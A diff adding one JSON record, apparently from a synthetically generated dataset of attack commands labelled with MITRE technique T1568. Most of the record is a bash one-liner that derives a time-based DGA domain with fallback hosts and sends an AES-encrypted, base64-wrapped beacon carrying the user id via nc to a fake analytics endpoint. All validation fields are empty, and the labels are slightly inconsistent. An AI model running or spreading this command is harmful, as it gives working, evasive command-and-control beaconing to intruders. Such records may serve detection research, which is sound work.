@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"seed='media'$(date -u +%Y%m%d%H); sha=$(printf '%s' \\\"$seed\\\" | sha256sum | cut -d' ' -f1); d=\\\"${sha:0:10}.org\\\"; for h in \\\"$d\\\" media-cdn.example.com assets.example.net; do ip=$(getent hosts \\\"$h\\\" | awk '{print $1}' | head -n1); if [ -n \\\"$ip\\\" ]; then host=\\\"$h\\\"; break; fi; done; ua=\\\"Mozilla/5.0\\\"; msg=$(printf '{\"op\":\"beacon\",\"uid\":\"%s\",\"t\":%s}' \\\"$(id -u)\\\" \\\"$(date -u +%s)\\\"); enc=$(printf '%s' \\\"$msg\\\" | openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:\\\"$USER-$(date -u +%Y%m%d)\\\" | base64 -w0); body=\\\"d=$enc\\\"; printf 'POST /api/v1/collect HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n%s' \\\"$host\\\" \\\"$ua\\\" ${#body} \\\"$body\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Uses a time-based DGA to derive a domain and resolves it at runtime with a fallback list; sends AES-encrypted, base64-wrapped beacon data via an HTTP POST to mimic analytics collection.",
+  "rationale_steps": [
+    "Generate a DGA domain from the current hour to rotate endpoints.",
+    "Resolve using system resolver (getent) with fallback candidates.",
+    "Encrypt instructions with AES-256-CBC and wrap in base64.",
+    "POST to a plausible analytics endpoint over TCP via nc."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-39fa7bed",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
